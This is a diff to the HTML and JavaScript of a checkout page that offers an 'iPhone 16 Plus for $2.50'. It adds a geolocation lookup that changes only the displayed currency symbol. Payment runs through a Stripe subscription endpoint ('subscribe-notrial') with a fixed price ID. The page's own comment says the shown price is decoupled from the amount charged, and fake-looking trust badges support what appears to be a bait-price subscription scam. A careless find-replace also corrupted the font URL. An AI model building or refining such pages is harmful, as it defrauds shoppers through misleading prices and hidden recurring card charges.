@@ -3,8 +3,8 @@
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Get The iPhone 16 Plus for $600!</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <title>Get The iPhone 16 Plus for $2.50!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
 
   <style>
     :root{
@@ -59,7 +59,9 @@
 
     <!-- STEP 1 -->
     <section id="step1" class="card step" aria-hidden="false">
-      <h1 class="title">Get The iPhone 16 Plus for $600!</h1>
+      <h1 class="title">
+        Get The iPhone 16 Plus for <span id="priceHero" data-price> $2.50</span>!
+      </h1>
       <p class="sub">Limited-time offer. Secure your new iPhone today!</p>
 
       <div class="img-wrap">
@@ -101,7 +103,7 @@
 
       <div class="btn-row">
         <button id="backBtn" class="btn muted-btn">← Back</button>
-        <button class="btn" id="payNow">Pay $600 Securely</button>
+        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$2.50</span> Securely</button>
       </div>
 
       <div class="brands">
@@ -109,7 +111,7 @@
         <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard">
         <img src="https://charmr.xyz/logos/amex.png" alt="Amex">
         <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
-              </div>
+      </div>
 
       <p class="trust-text">🔒 256-bit SSL Secured · Powered by Stripe · 30-Day Money Back Guarantee</p>
     </section>
@@ -127,12 +129,61 @@
   <!-- Stripe.js -->
   <script src="https://js.stripe.com/v3/"></script>
   <script>
-    // Step navigation (same as before)
+    /* ---------- Step navigation ---------- */
     const step1=document.getElementById('step1'),step2=document.getElementById('step2');
-    document.getElementById('nextBtn').onclick=()=>{ if(!nameInput.value||!emailInput.value){alert("Please enter your details");return} localStorage.setItem("checkout_name",nameInput.value);localStorage.setItem("checkout_email",emailInput.value); step1.setAttribute("aria-hidden","true");step2.setAttribute("aria-hidden","false");}
-    document.getElementById('backBtn').onclick=()=>{ step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true"); }
+    document.getElementById('nextBtn').onclick=()=>{ 
+      if(!nameInput.value||!emailInput.value){alert("Please enter your details");return}
+      localStorage.setItem("checkout_name",nameInput.value);
+      localStorage.setItem("checkout_email",emailInput.value);
+      step1.setAttribute("aria-hidden","true");
+      step2.setAttribute("aria-hidden","false");
+    };
+    document.getElementById('backBtn').onclick=()=>{ 
+      step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true");
+    };
 
-    // Stripe logic (copied exactly from verification-black.html, unchanged)
+    /* ---------- Currency symbol by IP (display only) ---------- 
+       - Uses a lightweight public endpoint to get the country code.
+       - Adjusts all elements with [data-price] to the correct symbol.
+       - US → $, GB → £, EU countries → €; otherwise falls back to $.
+       - NOTE: This does NOT change your Stripe currency/amount—only the visible text.
+    */
+    (function setCurrencyByIP(){
+      const EU = new Set([
+        'AT','BE','BG','HR','CY','CZ','DK','EE','FI','FR','DE','GR','HU','IE','IT',
+        'LV','LT','LU','MT','NL','PL','PT','RO','SK','SI','ES','SE'
+      ]);
+      function symbolFor(cc){
+        if(cc==='US') return '$';
+        if(cc==='GB' || cc==='UK') return '£';
+        if(EU.has(cc)) return '€';
+        return '$';
+      }
+      function apply(symbol){
+        document.querySelectorAll('[data-price]').forEach(el=>{
+          el.textContent = `${symbol}2.50`;
+        });
+        // Also update document title if it contains a price
+        document.title = `Get The iPhone 16 Plus for ${symbol}2.50!`;
+      }
+      // Fallback immediately (so users see something) then refine
+      apply('$');
+
+      // Fetch country code by IP (privacy: only country code, no precise location)
+      fetch('https://ipapi.co/json/')
+        .then(r => r.ok ? r.json() : Promise.reject())
+        .then(data => apply(symbolFor((data && data.country) || (data && data.country_code) || 'US')))
+        .catch(() => {
+          try {
+            // Soft fallback using locale if fetch fails
+            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';
+            const cc = (loc.split('-')[1] || 'US').toUpperCase();
+            apply(symbolFor(cc));
+          } catch { /* keep default $ */ }
+        });
+    })();
+
+    /* ---------- Stripe logic (unchanged from your verification-black.html) ---------- */
     const SUBSCRIBE_URL="https://charmr-jfmc.onrender.com/api/stripe/subscribe-notrial";
     const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
     const FIXED_PRICE_ID="price_1Rzdp0EJXIhiKzYGlVxHGH7W";
@@ -140,8 +191,21 @@
     const cardNumber=elements.create("cardNumber"),cardExpiry=elements.create("cardExpiry"),cardCvc=elements.create("cardCvc");
     cardNumber.mount("#card-number");cardExpiry.mount("#card-expiry");cardCvc.mount("#card-cvc");
     const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
-    function showError(m){$err.textContent=m;$err.style.display="block"}function hideError(){$err.textContent="";$err.style.display="none"}function showLoading(){overlay.setAttribute("aria-hidden","false")}function hideLoading(){overlay.setAttribute("aria-hidden","true")}
-    document.getElementById("payNow").onclick=async()=>{hideError();showLoading();const pm=await stripe.createPaymentMethod({type:"card",card:cardNumber,billing_details:{name:nameInput.value,email:emailInput.value}});if(pm.error){hideLoading();showError(pm.error.message);return}const res=await fetch(SUBSCRIBE_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({priceId:FIXED_PRICE_ID,paymentMethodId:pm.paymentMethod.id,name:nameInput.value,email:emailInput.value})});const data=await res.json();if(!data.clientSecret){hideLoading();showError("Payment failed");return}const conf=await stripe.confirmCardPayment(data.clientSecret);if(conf.error){hideLoading();showError(conf.error.message);return}if(conf.paymentIntent&&conf.paymentIntent.status==="succeeded"){window.location.href="thankyou2.html"}else{hideLoading();showError("Payment not completed")}}
+    function showError(m){$err.textContent=m;$err.style.display="block"}
+    function hideError(){$err.textContent="";$err.style.display="none"}
+    function showLoading(){overlay.setAttribute("aria-hidden","false")}
+    function hideLoading(){overlay.setAttribute("aria-hidden","true")}
+    document.getElementById("payNow").onclick=async()=>{
+      hideError();showLoading();
+      const pm=await stripe.createPaymentMethod({type:"card",card:cardNumber,billing_details:{name:nameInput.value,email:emailInput.value}});
+      if(pm.error){hideLoading();showError(pm.error.message);return}
+      const res=await fetch(SUBSCRIBE_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({priceId:FIXED_PRICE_ID,paymentMethodId:pm.paymentMethod.id,name:nameInput.value,email:emailInput.value})});
+      const data=await res.json();
+      if(!data.clientSecret){hideLoading();showError("Payment failed");return}
+      const conf=await stripe.confirmCardPayment(data.clientSecret);
+      if(conf.error){hideLoading();showError(conf.error.message);return}
+      if(conf.paymentIntent&&conf.paymentIntent.status==="succeeded"){window.location.href="thankyou2.html"}else{hideLoading();showError("Payment not completed")}
+    };
   </script>
 </body>
 </html>
